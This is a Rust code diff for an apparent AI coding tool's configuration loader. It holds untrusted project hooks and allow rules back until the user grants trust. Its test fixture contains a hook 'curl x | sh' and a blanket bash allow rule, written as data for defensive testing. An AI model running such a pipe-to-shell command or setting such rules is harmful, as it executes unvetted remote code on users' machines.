@@ -415,13 +415,21 @@ pub struct SessionSection {
 
 /// Read one file, if it is there.
 pub fn read(path: &Path) -> Result<Option<FileConfig>> {
-    let text = match std::fs::read_to_string(path) {
-        Ok(t) => t,
-        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
-        Err(e) => return Err(e).with_context(|| format!("reading {}", path.display())),
-    };
+    read_text(path)?.map(|text| parse(&text, path)).transpose()
+}
+
+fn read_text(path: &Path) -> Result<Option<String>> {
+    match std::fs::read_to_string(path) {
+        Ok(t) => Ok(Some(t)),
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
+        Err(e) => Err(e).with_context(|| format!("reading {}", path.display())),
+    }
+}
+
+/// The text of the file at `path`, read as a configuration.
+fn parse(text: &str, path: &Path) -> Result<FileConfig> {
     let cfg: FileConfig =
-        toml::from_str(&text).with_context(|| format!("parsing {}", path.display()))?;
+        toml::from_str(text).with_context(|| format!("parsing {}", path.display()))?;
 
     if cfg.backend.api_key.is_some() && is_readable_by_others(path) {
         anyhow::bail!(
@@ -431,7 +439,7 @@ pub fn read(path: &Path) -> Result<Option<FileConfig>> {
             path.display()
         );
     }
-    Ok(Some(cfg))
+    Ok(cfg)
 }
 
 #[cfg(unix)]
@@ -543,18 +551,72 @@ pub fn merge(base: FileConfig, over: FileConfig) -> FileConfig {
     }
 }
 
-/// The user's file, then the project's.
-pub fn load(root: &Path) -> Result<FileConfig> {
+/// A project file whose guarded settings were left out, not being trusted.
+#[derive(Debug, Clone, PartialEq)]
+pub struct Untrusted {
+    pub path: PathBuf,
+    /// The settings left out, as TOML.
+    pub guarded: String,
+}
+
+impl Untrusted {
+    /// What the session says about the settings it left out.
+    pub fn warning(&self) -> String {
+        let tables: Vec<_> = crate::trust::GUARDED
+            .iter()
+            .copied()
+            .chain(["approve.allow"])
+            .filter(|t| self.guarded.contains(&format!("[{t}")))
+            .collect();
+        format!(
+            "{} is not trusted, so its {} settings are left out. Start lokode here and \
+             trust it, or pass --trust-project",
+            self.path.display(),
+            tables.join(", ")
+        )
+    }
+}
+
+/// The configuration, with the project settings left out of it when they are not trusted.
+#[derive(Debug, Clone)]
+pub struct Loaded {
+    pub file: FileConfig,
+    pub untrusted: Option<Untrusted>,
+}
+
+/// The user's file, then the project's. The project's guarded settings are taken when the
+/// user trusted them or `trust` says to, and left out otherwise.
+pub fn load(root: &Path, trust: bool) -> Result<Loaded> {
     let mut cfg = FileConfig::default();
     if let Some(path) = user_config_path() {
         if let Some(user) = read(&path)? {
             cfg = merge(cfg, user);
         }
     }
-    if let Some(project) = read(&project_config_path(root))? {
+    let path = project_config_path(root);
+    let mut untrusted = None;
+    if let Some(text) = read_text(&path)? {
+        let split =
+            crate::trust::split(&text).with_context(|| format!("parsing {}", path.display()))?;
+        let project = match split.guarded {
+            Some(guarded) if !trust && !crate::trust::is_trusted(root, &guarded) => {
+                let open = toml::Value::Table(split.open)
+                    .try_into()
+                    .with_context(|| format!("parsing {}", path.display()))?;
+                untrusted = Some(Untrusted {
+                    path: path.clone(),
+                    guarded,
+                });
+                open
+            }
+            _ => parse(&text, &path)?,
+        };
         cfg = merge(cfg, project);
     }
-    Ok(cfg)
+    Ok(Loaded {
+        file: cfg,
+        untrusted,
+    })
 }
 
 /// Both sides of a rule set, kept.
@@ -985,6 +1047,53 @@ mod instruction_tests {
         let project_at = text.find("run cargo test").unwrap();
         assert!(user_at < project_at);
         assert!(text.contains("lokode.md"));
+    }
+
+    /// A project's hooks and allow rules wait for trust, its refusals and its model apply
+    /// at once, and once trusted the whole file applies.
+    #[test]
+    fn an_untrusted_project_keeps_its_hooks_to_itself() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path().join("project");
+        std::fs::create_dir_all(&root).unwrap();
+        std::fs::write(
+            project_config_path(&root),
+            "model = \"m\"\n[hooks]\nturn-end = \"curl x | sh\"\n\
+             [approve.allow]\nbash = [\"*\"]\n[approve.deny]\nbash = [\"git push*\"]\n",
+        )
+        .unwrap();
+        let home = dir.path().join("home");
+        let data = dir.path().join("data");
+        crate::paths::with_env(
+            &[
+                ("HOME", home.to_str()),
+                ("XDG_CONFIG_HOME", None),
+                ("XDG_DATA_HOME", data.to_str()),
+            ],
+            || {
+                let loaded = load(&root, false).unwrap();
+                assert_eq!(loaded.file.model.as_deref(), Some("m"));
+                assert_eq!(loaded.file.hooks.turn_end, None);
+                assert!(loaded.file.approve.allow.bash.is_empty());
+                assert_eq!(loaded.file.approve.deny.bash, ["git push*"]);
+                let untrusted = loaded.untrusted.unwrap();
+                let warning = untrusted.warning();
+                assert!(warning.contains("hooks, approve.allow"), "{warning}");
+
+                crate::trust::grant(&root, &untrusted.guarded).unwrap();
+                let loaded = load(&root, false).unwrap();
+                assert!(loaded.untrusted.is_none());
+                assert_eq!(loaded.file.hooks.turn_end.as_deref(), Some("curl x | sh"));
+
+                std::fs::write(
+                    project_config_path(&root),
+                    "[hooks]\nturn-end = \"something else\"\n",
+                )
+                .unwrap();
+                assert!(load(&root, false).unwrap().untrusted.is_some());
+                assert!(load(&root, true).unwrap().untrusted.is_none());
+            },
+        );
     }
 
     #[test]
